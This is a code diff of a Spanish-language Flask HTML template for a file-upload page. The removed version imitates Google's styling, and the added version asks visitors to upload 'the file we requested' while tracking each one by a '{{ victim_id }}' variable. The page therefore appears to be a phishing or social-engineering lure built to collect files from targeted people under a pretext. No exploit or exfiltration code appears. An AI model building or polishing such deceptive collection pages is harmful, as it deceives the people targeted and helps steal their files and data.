@@ -3,92 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Subida de Archivo</title>
-    <!-- Carga de Tailwind CSS -->
+    <title>Carga tu Archivo</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #f7f9fb; }
-        /* Oculta el input de archivo por defecto */
-        .custom-file-input {
-            opacity: 0;
-            position: absolute;
-            z-index: -1;
+        /* Estilos personalizados para un mejor aspecto */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1a1a2e; /* Fondo oscuro */
+            color: #e4e4e7; /* Texto claro */
         }
-        /* Estilo del área donde el usuario hace clic */
-        .file-label {
-            cursor: pointer;
-            display: block;
-            padding: 2.5rem 1rem;
-            border: 2px dashed #a0aec0; /* Borde suave */
-            border-radius: 0.5rem;
+        .container {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            background-color: #2a2a44; /* Tarjeta más oscura */
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 90%;
+            border-radius: 12px;
+            padding: 2.5rem;
+            border: 1px solid #4a4a6e;
+        }
+        .file-input {
+            border: 2px dashed #4a4a6e;
+            padding: 1.5rem;
+            border-radius: 8px;
             text-align: center;
-            color: #4b5563;
+            cursor: pointer;
             transition: all 0.2s;
-            background-color: #f8fafc;
         }
-        /* Efecto al pasar el mouse (simula un estado activo) */
-        .file-label:hover {
-            border-color: #1a73e8; /* Azul de Google */
-            color: #1a73e8;
-            background-color: #eef5ff;
+        .file-input:hover {
+            border-color: #6a6a8e;
+            background-color: #3a3a54;
         }
-        .google-button {
-            background-color: #1a73e8;
-            transition: background-color 0.3s;
+        .submit-button {
+            background-color: #007bff; /* Color primario azul */
+            transition: background-color 0.2s, transform 0.1s;
         }
-        .google-button:hover {
-            background-color: #176bd9;
+        .submit-button:hover {
+            background-color: #0056b3;
+            transform: translateY(-1px);
         }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
-    <div class="w-full max-w-md bg-white p-8 rounded-xl shadow-2xl border border-gray-100">
-        <h1 class="text-3xl font-bold text-center text-gray-800 mb-2">Paso 2: Subir Archivo</h1>
-        <p class="text-center text-gray-500 mb-8">Sube el archivo que se almacenará en tu **Bucket 'files'** de Supabase.</p>
-        
-        <form action="/process_upload" method="post" enctype="multipart/form-data" class="space-y-6">
-            <!-- ID de sesión para mantener el rastro -->
-            <input type="hidden" name="session_id" value="{{ session_id }}">
-            
-            <div>
-                <label class="block text-sm font-medium text-gray-700 mb-2">Seleccionar Archivo</label>
-                <!-- Área de clic visual -->
-                <label for="file-upload" id="file-label" class="file-label">
-                    <svg class="mx-auto h-12 w-12 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.884-7.859A5.002 5.002 0 0110 5a5.002 5.002 0 014.884 4.141A4 4 0 0117 16H7zM16 16l-4-4m0 0l-4 4m4-4v12"></path></svg>
-                    <span id="file-name" class="font-semibold block mt-3">Arrastra o haz clic para seleccionar</span>
-                    <span class="block text-xs mt-1 text-gray-500">Cualquier formato de archivo (Max 5MB)</span>
-                </label>
-                <!-- El input real (oculto) -->
-                <input type="file" id="file-upload" name="file" required class="custom-file-input" onchange="updateFileName(this)">
-            </div>
-            
-            <button type="submit"
-                    class="w-full google-button text-white p-3 rounded-lg font-semibold shadow-md focus:outline-none focus:ring-4 focus:ring-blue-300 transform hover:scale-[1.01] transition duration-200">
-                Subir Archivo y Finalizar
-            </button>
-        </form>
+<body>
+    <div class="container">
+        <div class="card">
+            <h1 class="text-3xl font-bold mb-6 text-center text-white">Carga de Archivo Importante</h1>
+            <p class="text-sm text-center mb-6 text-gray-400">
+                Por favor, sube el archivo que te solicitamos.
+                <!-- Muestra el ID de víctima para referencia interna/debugging -->
+                <span class="block mt-2 text-xs opacity-50">ID de Sesión: {{ victim_id }}</span>
+            </p>
 
-        <p class="mt-6 text-xs text-center text-gray-400">ID de Sesión: <code>{{ session_id }}</code></p>
+            <!-- 
+            *** CORRECCIÓN CLAVE AQUÍ: action="{{ url_for('upload_file') }}" ***
+            Aseguramos que el formulario POST envíe los datos a la función 
+            `upload_file` de Flask, que es la que maneja la carga del archivo.
+            -->
+            <form method="POST" action="{{ url_for('upload_file') }}" enctype="multipart/form-data" class="space-y-6">
+                
+                <div class="file-input">
+                    <label for="file" class="block cursor-pointer">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="mx-auto h-8 w-8 text-indigo-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" />
+                        </svg>
+                        <p class="mt-2 text-sm font-medium">Arrastra y suelta o haz clic para subir</p>
+                        <p class="text-xs text-gray-500">Máximo 10MB</p>
+                    </label>
+                    <!-- 
+                    El campo 'file' debe coincidir con request.files['file'] en main.py 
+                    IMPORTANTE: El input 'file' debe ser invisible y la etiqueta se encarga de la interacción.
+                    -->
+                    <input id="file" name="file" type="file" required class="sr-only">
+                </div>
+
+                <button type="submit" class="submit-button w-full text-white font-semibold py-2 rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-4 focus:ring-blue-500 focus:ring-opacity-50">
+                    Subir Archivo
+                </button>
+            </form>
+        </div>
     </div>
-    
-    <script>
-        // Función para actualizar el nombre del archivo seleccionado
-        function updateFileName(input) {
-            const fileNameSpan = document.getElementById('file-name');
-            const fileLabel = document.getElementById('file-label');
-            if (input.files && input.files.length > 0) {
-                // Muestra el nombre del archivo seleccionado
-                fileNameSpan.textContent = `Archivo seleccionado: ${input.files[0].name}`;
-                // Resalta la caja en verde
-                fileLabel.classList.add('border-green-500');
-                fileLabel.classList.remove('border-gray-300');
-            } else {
-                // Vuelve al texto por defecto si el usuario cancela la selección
-                fileNameSpan.textContent = 'Arrastra o haz clic para seleccionar';
-                fileLabel.classList.remove('border-green-500');
-                fileLabel.classList.add('border-gray-300');
-            }
-        }
-    </script>
 </body>
 </html>
